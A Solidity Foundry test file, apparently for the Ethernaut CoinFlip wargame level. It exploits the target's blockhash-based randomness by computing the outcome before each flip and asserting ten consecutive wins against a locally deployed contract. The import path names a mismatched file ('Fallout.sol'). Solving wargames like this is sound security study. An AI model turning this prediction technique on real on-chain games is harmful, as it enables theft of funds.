// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../Level3/Fallout.sol";

contract CoinFlipTest is Test {
    address public contractAddress = 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d;
    uint256 public Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public coinflip;

    function setUp() public {
        coinflip = new CoinFlip();
    }

    function test_contractDeployed() public view {
        assert(address(coinflip) != address(0));
    }

    function test_flip() public {
        //   vm.roll(block.number + 3);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 res = blockValue / Factor;
        console.log(blockValue, res);

        coinflip.flip(false);
    }

    function test_consecutiveWins() public {
        uint256 consecutiveWinsBefore = coinflip.consecutiveWins();
        uint256 flips = 10;

        for (uint256 i = 0; i < flips; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 res = blockValue / Factor;
            if (res == 1) {
                coinflip.flip(true);
            } else {
                coinflip.flip(false);
            }
            vm.roll(block.number + 1);
        }

        uint256 consecutiveWinsAfter = coinflip.consecutiveWins();

        assertEq(consecutiveWinsAfter - consecutiveWinsBefore, 10);
    }
}
